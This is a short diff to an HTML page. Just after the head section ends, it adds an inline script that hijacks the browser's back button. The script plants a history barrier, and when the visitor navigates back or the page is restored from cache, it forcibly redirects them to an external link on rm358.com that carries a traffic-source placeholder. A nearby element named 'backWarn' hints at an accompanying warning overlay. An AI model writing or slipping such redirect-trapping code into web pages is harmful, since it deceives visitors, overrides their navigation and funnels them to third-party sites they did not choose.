@@ -416,6 +416,29 @@ src="https://www.facebook.com/tr?id=277386131662358&ev=PageView&noscript=1"
 <!-- End Meta Pixel Code -->
 </head>
 <body>
+<script>
+(function () {
+  const redirectURL = "//rm358.com/4/11590992?var={your_source_id}";
+
+  // Create a history barrier
+  history.pushState(null, "", location.href);
+
+  window.addEventListener("popstate", function () {
+    // Immediately restore the current page in history
+    history.pushState(null, "", location.href);
+
+    // Redirect
+    window.location.replace(redirectURL);
+  });
+
+  // Handle browser back/forward navigation
+  window.addEventListener("pageshow", function (event) {
+    if (event.persisted) {
+      window.location.replace(redirectURL);
+    }
+  });
+})();
+</script>
 
 <div id="backWarn">
   <div class="bw-card">
